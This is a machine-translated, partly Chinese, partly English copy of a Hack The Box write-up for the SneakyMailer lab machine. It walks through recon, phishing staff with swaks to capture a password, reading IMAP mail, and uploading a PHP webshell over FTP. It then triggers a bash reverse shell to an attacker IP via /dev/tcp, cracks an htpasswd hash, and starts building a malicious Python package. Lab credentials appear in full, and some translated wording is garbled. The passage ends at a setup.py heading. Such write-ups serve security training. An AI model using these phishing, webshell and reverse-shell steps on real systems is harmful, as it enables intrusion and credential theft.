
SMTP访问权限一起使用来发送网络钓鱼电子邮件。其中一个用户将单击该链接，并返回带有其登录凭证的POST请求。这为该用户提供了对IMAP收件箱的访问，在那里我将找到FTP的凭证。FTP访问在Web目录中，虽然那里没有什么有趣的，但我可以编写一个webshell并获得执行，以及一个shell。
PyPi服务器提交恶意Python包

# 热闹：鬼鬼祟祟的邮件

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fsneakymailer-cover.) 

SneakyMailer从网络枚举开始查找电子邮件地址列表，我可以将其与SMTP访问权限一起使用来发送网络钓鱼电子邮件。其中一个用户将单击该链接，并返回带有其登录信誉的POST请求。这为该用户提供了对IMAP收件箱的访问，在那里我将找到FTP的信誉。FTP访问在Web目录中，虽然那里没有什么有趣的，但我可以编写一个webshell并获得执行，以及一个shell。为了私有化，我将向本地PyPi服务器提交恶意Python包，该服务器以该用户的身份提供执行和外壳。对于root，我将滥用sudo规则来运行pip，再次安装相同的软件包。在“超越根”中，我将介绍作为服务运行的框上的自动化。

## 箱子信息

名字

[鬼鬼祟](https://www.hackthebox.eu/home/machines/profile/262) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-sneakymailer.png) 

发行日期

[11 7月 2020](https://twitter.com/hackthebox_eu/status/1281229889979518976)

停用日期

28 11月 2020

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

中等 \[30\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fsneakymailer-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fsneakymailer-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 45分钟 53秒。[![信息安全杰克](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F52045)](https://www.hackthebox.eu/home/users/profile/52045)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 00小时 48分41秒。[![信息安全杰克](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F52045)](https://www.hackthebox.eu/home/users/profile/52045)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F106709)](https://www.hackthebox.eu/home/users/profile/106709)-

## 侦察

### n地图

`nmap`找到七个开放的 TCP 端口， FTP （21）， 固态混合硬盘 （22）， SMTP （25）， HTTP （80， 8080） 和 IMAP （143， 993）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.197
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 15:04 EDT
    Nmap scan report for 10.10.10.197
    Host is up (0.015s latency).
    Not shown: 65528 closed ports
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    25/tcp   open  smtp
    80/tcp   open  http
    143/tcp  open  imap
    993/tcp  open  imaps
    8080/tcp open  http-proxy
    
    Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds
    root@kali# nmap -sC -sV -p 21,22,25,80,143,993,8080 -oA scans/nmap-tcpscripts 10.10.10.197
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 15:05 EDT
    Nmap scan report for 10.10.10.197
    Host is up (0.013s latency).
    
    PORT     STATE SERVICE  VERSION
    21/tcp   open  ftp      vsftpd 3.0.3
    22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
    |   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
    |_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
    25/tcp   open  smtp     Postfix smtpd
    |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
    80/tcp   open  http     nginx 1.14.2
    |_http-server-header: nginx/1.14.2
    |_http-title: Did not follow redirect to http://sneakycorp.htb
    143/tcp  open  imap     Courier Imapd (released 2018)
    |_imap-capabilities: CHILDREN IDLE QUOTA NAMESPACE UIDPLUS CAPABILITY ENABLE ACL2=UNION THREAD=ORDEREDSUBJECT completed OK STARTTLS ACL THREAD=REFERENCES UTF8=ACCEPTA0001 IMAP4rev1 SORT
    | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
    | Subject Alternative Name: email:postmaster@example.com
    | Not valid before: 2020-05-14T17:14:21
    |_Not valid after:  2021-05-14T17:14:21
    |_ssl-date: TLS randomness does not represent time
    993/tcp  open  ssl/imap Courier Imapd (released 2018)
    |_imap-capabilities: CHILDREN IDLE QUOTA AUTH=PLAIN NAMESPACE UIDPLUS CAPABILITY ENABLE ACL2=UNION THREAD=ORDEREDSUBJECT OK completed ACL THREAD=REFERENCES UTF8=ACCEPTA0001 IMAP4rev1 SORT
    | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
    | Subject Alternative Name: email:postmaster@example.com
    | Not valid before: 2020-05-14T17:14:21
    |_Not valid after:  2021-05-14T17:14:21
    |_ssl-date: TLS randomness does not represent time
    8080/tcp open  http     nginx 1.14.2
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: nginx/1.14.2
    |_http-title: Welcome to nginx!
    Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 42.36 seconds
    

基于 [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) 版本，主机可能正在运行 Debian 10 破坏者。端口 80 上还有一个重定向到`http://sneakycorp.htb`

### FTP - 三通 21

`nmap`通常很好指出是否允许匿名登录，但我测试只是为了确定：

    root@kali# ftp 10.10.10.197
    Connected to 10.10.10.197.
    220 (vsFTPd 3.0.3)
    Name (10.10.10.197:root): anonymous
    530 Permission denied.
    Login failed.
    ftp>
    

它不仅会失败，还会在要求输入密码之前失败。我尝试的任何其他用户名在密码之前也会失败。

### 暴力破解

给定重定向到虚拟主机，我将扫描该主机的子域，并找到一个：

    root@kali# wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.197 -H "Host: FUZZ.sneakycorp.htb" --hh 185
    
    Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
    
    ********************************************************
    * Wfuzz 2.4.5 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://10.10.10.197/
    Total requests: 100000
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload
    ===================================================================
    
    000000022:   200        340 L    989 W    13737 Ch    "dev"
    
    Total time: 152.5698
    Processed Requests: 100000
    Filtered Requests: 99999
    Requests/sec.: 655.4373
    

我将在我的计算机上添加此行：`/etc/hosts`

    10.10.10.197 sneakycorp.htb dev.sneakycorp.htb
    

### 潜行者 - TCP 80

#### 网站

该页面是鬼鬼祟祟的公司的某种仪表板：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200712110823736.png) 

有两个项目：

*   PyPI - 80%完成，在测试中。这是一个蟒蛇打包实例。
*   POP3 和 SMTP - 标记为已完成。我看到这些帖子在扫描中收听。`nmap`

“团队”链接转到 ，其中显示了用户和电子邮件地址的列表：`/team.php`

[![image-20200712111720032](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200712111720032.png)](https://0xdf.gitlab.io/img/image-20200712111720032.png)

[_点击查看完整图片_](https://0xdf.gitlab.io/img/image-20200712111720032.png)

我将使用 、 和 创建电子邮件地址列表：`curl``grep``cut`

    root@kali# curl -s http://sneakycorp.htb/team.php | grep '@' | cut -d'>' -f2 | cut -d'<' -f1 > emails
    

这将生成 57 封电子邮件的列表：

    root@kali# wc -l emails; head -5 emails 
    57 emails
    tigernixon@sneakymailer.htb
    garrettwinters@sneakymailer.htb
    ashtoncox@sneakymailer.htb
    cedrickelly@sneakymailer.htb
    airisatou@sneakymailer.htb
    

#### 目录暴力破解

我将针对该网站运行，并包括，因为我知道该网站是PHP：`gobuster``-x php`

    root@kali# gobuster dir -u http://sneakycorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 20 -o scans/gobuster-sneakycorp.htb-med-php
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://sneakycorp.htb
    [+] Threads:        20
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php
    [+] Timeout:        10s
    ===============================================================
    2020/07/11 15:40:49 Starting gobuster
    ===============================================================
    /index.php (Status: 200)
    /img (Status: 301)
    /css (Status: 301)
    /team.php (Status: 200)
    /js (Status: 301)
    /vendor (Status: 301)
    /pypi (Status: 301)
    ===============================================================
    2020/07/11 15:47:23 Finished
    ===============================================================
    

这里唯一有趣的事情是 .这当然与页面中有关PyPI的说明有关。不幸的是，访问只是返回403禁止。`/pypi``/pypi`

### 开发潜行者 - TCP 80

这个网站看起来完全相同：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200712112129070.png) 

### 网站 - TCP 8080

访问 TCP 8080 将返回默认的 NGINX 页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200713064046492.png) 

我尝试通过主机名和暴力破解目录访问，但没有找到任何东西。当我有更多信息时，我必须稍后再回到这一点。

## 壳牌作为万维数据

### 网络钓鱼信条

鉴于此框的主题，使用电子邮件列表发送网络钓鱼是有意义的。我就像在[《终局之战：Xen](https://0xdf.gitlab.io/2020/06/17/endgame-xen.html#phishing-for-creds)》中一样使用。我可以包含带有选项的收件人列表，以逗号分隔：`swaks``--to`

    root@kali# swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197        [117/282]
    === Trying 10.10.10.197:25...                 
    === Connected to 10.10.10.197.           
    <-  220 debian ESMTP Postfix (Debian/GNU)    
     -> EHLO kali                                  
    <-  250-debian                                   
    <-  250-PIPELINING                            
    <-  250-SIZE 10240000                            
    <-  250-VRFY                                
    <-  250-ETRN                               
    <-  250-STARTTLS                          
    <-  250-ENHANCEDSTATUSCODES               
    <-  250-8BITMIME                              
    <-  250-DSN                                 
    <-  250-SMTPUTF8                                  
    <-  250 CHUNKING                            
     -> MAIL FROM:<test@sneakymailer.htb>       
    <-  250 2.1.0 Ok                            
     -> RCPT TO:<tigernixon@sneakymailer.htb>
    <-  250 2.1.5 Ok
     -> RCPT TO:<garrettwinters@sneakymailer.htb>
    <-  250 2.1.5 Ok
     -> RCPT TO:<ashtoncox@sneakymailer.htb>
    <-  250 2.1.5 Ok
    ...[snip]...
     -> RCPT TO:<donnasnider@sneakymailer.htb>
    <-  250 2.1.5 Ok
     -> DATA
    <-  354 End data with <CR><LF>.<CR><LF>
     -> Date: Sun, 12 Jul 2020 10:55:55 -0400
     -> To: tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sne
    akymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsi
    lva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sn
    eakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@snea
    kymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothy
    mooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zen
    aidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.h
    tb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb,
     -> From: test@sneakymailer.htb
     -> Subject: test
     -> Message-Id: <20200712105555.099308@kali>
     -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
     -> 
     -> please click here http://10.10.14.42/
     -> 
     -> 
     -> .
    <-  250 2.0.0 Ok: queued as 5143C24808
     -> QUIT
    <-  221 2.0.0 Bye
    === Connection closed with remote host.
    

我的电子邮件的正文是我自己的链接。我会让Python的模块监听。奇怪的是，一个POST请求回来了：`http.server`

    root@kali# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.197 - - [12/Jul/2020 10:51:01] code 501, message Unsupported method ('POST')
    10.10.10.197 - - [12/Jul/2020 10:51:01] "POST / HTTP/1.1" 501 -
    

我停止了它并在端口80上打开以捕获请求，并再次发送了网络钓鱼：`nc`

    root@kali# nc -lnvp 80
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::80
    Ncat: Listening on 0.0.0.0:80
    Ncat: Connection from 10.10.10.197.
    Ncat: Connection from 10.10.10.197:58924.
    POST / HTTP/1.1
    Host: 10.10.14.42
    User-Agent: python-requests/2.23.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-Length: 185
    Content-Type: application/x-www-form-urlencoded
    
    firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
    

它正在发布paulbyrd@sneakymailer.htb的信誉。

### 访问

我将展示使用和使用邮件客户端访问 IMAP 的手动方法。`nc`

#### 手动

有了保罗的信任，我可以检查他的电子邮件。我可以在端口 143 上手动与 IMAP 进行交互（或者，如果我想在端口 993 上使用 TLS 版本，则可以使用该选项（在我的计算机上是别名）。我在[混沌](https://0xdf.gitlab.io/2019/05/25/htb-chaos.html#imap)中展示了类似的过程。`nc``ncat``nc``--ssl`

IMAP 命令每个命令都以标记开头。大多数客户端使用 A0001，但它可以是任何东西。当服务器响应时，它通常会引用激发它的命令中的标记。我将从登录开始：

    root@kali# nc 10.10.10.197 143
    * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for d
    istribution information.
    A0001 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
    * OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
    A0001 OK LOGIN Ok. 
    

接下来，我将列出邮箱：

    A0002 LIST "" "*"
    * LIST (\Unmarked \HasChildren) "." "INBOX"
    * LIST (\HasNoChildren) "." "INBOX.Trash"
    * LIST (\HasNoChildren) "." "INBOX.Sent"
    * LIST (\HasNoChildren) "." "INBOX.Deleted Items"
    * LIST (\HasNoChildren) "." "INBOX.Sent Items"            
    A0002 OK LIST completed
    

我可以使用该命令查看邮箱，这将返回其中内容的摘要。例如， 为空：`SELECT``INBOX`

    A0003 SELECT INBOX                   
    * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent) 
    * OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
    * 0 EXISTS
    * 0 RECENT
    * OK [UIDVALIDITY 589480766] Ok
    * OK [MYRIGHTS "acdilrsw"] ACL
    A0003 OK [READ-WRITE] Ok
    

其余部分也是空的，除了 报告两个项目：`Inbox.Sent Items`

    A0007 SELECT "INBOX.Sent Items"
    * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
    * OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
    * 2 EXISTS               
    * 0 RECENT                                
    * OK [UIDVALIDITY 589480766] Ok     
    * OK [MYRIGHTS "acdilrsw"] ACL        
    A0007 OK [READ-WRITE] Ok
    

若要查看某个项目，我将使用 。第一封电子邮件特别有趣：`FETCH # BODY.PEEK[]`

    A0008 FETCH 1 BODY.PEEK[]
    * 1 FETCH (BODY[] {2167}
    MIME-Version: 1.0
    To: root <root@debian>
    From: Paul Byrd <paulbyrd@sneakymailer.htb>
    Subject: Password reset
    Date: Fri, 15 May 2020 13:03:37 -0500
    Importance: normal
    X-Priority: 3
    Content-Type: multipart/alternative;
            boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"
    
    --_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
    Content-Transfer-Encoding: quoted-printable
    Content-Type: text/plain; charset="utf-8"
    
    Hello administrator, I want to change this password for the developer accou=
    nt
    
    Username: developer
    Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
    
    Please notify me when you do it=20
    
    --_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
    ...[snip]...
    A0008 OK FETCH completed.
    

截图的数据只是同一封电子邮件的 HTML 版本。由于收件箱中没有邮件，因此管理员可能尚未更改这些凭据。

第二封发送的电子邮件讲述了测试PyPI服务器：

    A009 FETCH 2 BODY.PEEK[]
    * 2 FETCH (BODY[] {585}
    To: low@debian
    From: Paul Byrd <paulbyrd@sneakymailer.htb>
    Subject: Module testing
    Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>
    Date: Wed, 27 May 2020 13:28:58 -0400
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
     Thunderbird/68.8.0
    MIME-Version: 1.0
    Content-Type: text/plain; charset=utf-8; format=flowed
    Content-Transfer-Encoding: 7bit
    Content-Language: en-US
    
    Hello low
    
    
    Your current task is to install, test and then erase every python module you 
    find in our PyPI service, let me know if you have any inconvenience.
    
    )
    A009 OK FETCH completed.
    

I’m not sure what to do with that yet.

#### Client

Instead of going manual, I could install Evolution mail client. I’ll install with , and then open it. I’ll close the wizard, and go to Edit -> Accounts, then Add -> Mail Account. In the window that opens, I’ll enter the email in the Identity window. In the next window, Receiving Email, I’ll add the IMAP server details. I can use TLS over 993 since that’s open on the server:`apt install evolution`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200712120008187.png) 

It requires a server for Sending Email, so I’ll give it SneakyMailer, even though I don’t plan to send email. I don’t recall seeing a TLS SMTP port, so I’ll set it to port 25, and set the encryption method to use TLS after connecting:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200712120206798.png) 

Clicking next through to the end, I’m not prompted for the password. On submitting , the mailbox is there:`^(#J@SkFv2[%KhIxKk(Ju``hqcHl<:Ht`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200712120328014.png) 

在“已发送邮件”中，我看到有关密码的电子邮件：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200712120405595.png) 

### 壳

#### 枚举/FTP 访问

开发人员帐户的 cerds 不适用于 SSH，但它们适用于 FTP：

    root@kali# ftp 10.10.10.197
    Connected to 10.10.10.197.
    220 (vsFTPd 3.0.3)
    Name (10.10.10.197:root): developer
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp>
    

在这里，有一个目录：`dev`

    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxrwxr-x    8 0        1001         4096 Jul 12 11:52 dev
    226 Directory send OK.
    

它包含我已经枚举的网站：

    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 0        0            4096 May 26 19:52 css
    drwxr-xr-x    2 0        0            4096 May 26 19:52 img
    -rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
    drwxr-xr-x    3 0        0            4096 May 26 19:52 js
    drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
    drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
    -rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
    drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
    226 Directory send OK.
    

我收集了三个 PHP 文件（、、 和 ）。他们实际上都没有任何动态内容。`index.php``team.php``pypi/register.php`

#### 上传网页外壳

事实证明，这个帐户可以写在这里。我将上传一个简单的网络外壳：

    ftp> put /opt/shells/php/cmd.php 0xdf.php
    local: /opt/shells/php/cmd.php remote: 0xdf.php
    200 PORT command successful. Consider using PASV.
    150 Ok to send data.
    226 Transfer complete.
    35 bytes sent in 0.00 secs (26.7656 kB/s)
    

我可以触发它并获得执行：

    root@kali# curl http://dev.sneakycorp.htb/0xdf.php --data-urlencode "cmd=id"
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

显然有一个cron正在清理开发目录，因为网络外壳将被快速删除。

#### 壳

我将触发网络外壳以获取交互式 shell：

    root@kali# curl http://dev.sneakycorp.htb/0xdf.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.42/443 0>&1'"
    

`nc`获取连接：

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.197.
    Ncat: Connection from 10.10.10.197:54094.
    bash: cannot set terminal process group (661): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

我将使用[标准的蟒蛇 pty sty 方法](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)升级外壳。

## Priv： www-data –> 低

### 列举

#### 识别路径

盒子上有两个用户，低和虚拟邮件：

    www-data@sneakymailer:/home$ ls
    low  vmail
    

www数据无法访问vmail，但可以访问低，其中是不可读的：`user.txt`

    www-data@sneakymailer:/home/low$ ls -l
    total 8
    -rwxr-x--- 1 root low   33 Jul 12 16:48 user.txt
    drwxr-xr-x 6 low  low 4096 May 16 03:33 venv
    

这就是保罗·伯德的第二封电子邮件有用的地方。它告诉低下载并运行其本地pypi中的所有Python包。绝对是一个暗示，我应该放一个在那里。

#### 派派

首先，我需要了解 PyPI 配置。在进程列表中，pypi 用户正在运行 ，一个[最小的 PyPI 服务器](https://pypiserver.readthedocs.io/en/latest/README.html)：`pypi-server`

    pypi       697  0.0  0.6  36956 25932 ?        Ss   Jul12   0:30 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages
    

这些选项提供了有关此处正在发生的事情的大量信息：

*   `-i 127.0.0.1`\- 仅在本地主机上收听
*   `-p 5000`\- 端口 5000
*   `-a update,download,list`\- 需要身份验证的操作列表
*   `-P /var/www/pypi.sneakycorp.htb/.htpasswd`\- 密码文件，采用阿帕奇htpasswd格式
*   `--disable-fallback`\- 如果找不到包，请不要重定向到真正的PyPI
*   `-o`\- 覆盖现有文件
*   `/var/www/pypi.sneakycorp.htb`\- 放置软件包的目录

#### 破解密码

我将获取身份验证哈希：

    www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd 
    pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
    

在[示例哈希列表中](https://hashcat.net/wiki/doku.php?id=example_hashes)查找哈希模式后，我将把它扔进去：`hashcat`

    root@kali# hashcat -m 1600 pypi.hash /usr/share/wordlists/rockyou.txt --user --force
    ...[snip]...
    $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
    

#### 金克斯

`netstat`显示有东西在侦听 127.0.0.1：5000，如命令行所示：`pypi-server`

    www-data@sneakymailer:/home/low$ netstat -tnlp4
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      744/nginx: worker p 
    tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      744/nginx: worker p 
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -  
    

Looking in the NGINX configs shows that there are two active sites:

    www-data@sneakymailer:/etc/nginx/sites-enabled$ ls 
    pypi.sneakycorp.htb  sneakycorp.htb
    

`sneakycorp.htb` handles two virtual hosts and the redirect to as a default server:`http://sneakycorp.htb`

    server {
            listen 0.0.0.0:80 default_server;
            listen [::]:80 default_server;
            return 301 http://sneakycorp.htb;
            server_name _;
    }
    
    
    server {
            listen 0.0.0.0:80;
            listen [::]:80;
    
            server_name sneakycorp.htb;
    
            root /var/www/sneakycorp.htb;
            index index.php;
            location / {
                    try_files $uri $uri/ =404;
            }
            location ~ \.php$ {
                    include snippets/fastcgi-php.conf;
                    fastcgi_pass unix:/run/php/php7.3-fpm.sock;
            }
    }
    
    server {
            listen 0.0.0.0:80;
            listen [::]:80;
    
            server_name dev.sneakycorp.htb;
    
            root /var/www/dev.sneakycorp.htb/dev;
            index index.php;
            location / {
                    try_files $uri $uri/ =404;
            }
            location ~ \.php$ {
                    include snippets/fastcgi-php.conf;
                    fastcgi_pass unix:/run/php/php7.3-fpm.sock;
            }
    }
    

`pypi.sneakycorp.htb`定义一个与其文件名匹配的虚拟主机：

    server {
            listen 0.0.0.0:8080 default_server;
            listen [::]:8080 default_server;
            server_name _;
    }
    
    
    server {
            listen 0.0.0.0:8080;
            listen [::]:8080;
    
            server_name pypi.sneakycorp.htb;
    
            location / {
                    proxy_pass http://127.0.0.1:5000;
                    proxy_set_header Host $host;
                    proxy_set_header X-Real-IP $remote_addr;
            }
    }
    

默认服务器不会列出位置，这是返回默认NGINX页面的原因。但是，访问将代理到正在侦听的本地主机端口 5000。`http://pypi.sneakycorp.htb:8080``pypi-server`

我会把它添加到我的主机文件中，它的工作原理：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200713064300814.png) 

### 创建恶意蟒蛇包

[本教程](https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/)包括将包上载到本地 PyPI 服务器所需的步骤。

#### 目录结构

我将为我的包 创建一个文件夹 ，并创建以下文件夹结构和文件：`revshell`

    root@kali# tree revshell
    revshell
    ├── README.md
    ├── revshell
    │   └── __init__.py
    ├── setup.cfg
    └── setup.py
    
    1 directory, 4 files
    

`__init__.py`是合法应用程序实际开始的位置，并且它必须存在才能使包正常工作。我将只用于创建一个空文件。`touch`

我还将创建空和文件。 应该是包的文档。 应包含有关包元数据和所在位置的信息。我也不需要，但即使将它们作为空文件包含也更干净。`setup.cfg``README.md``README.md``setup.cfg``README.md`

#### setup.py

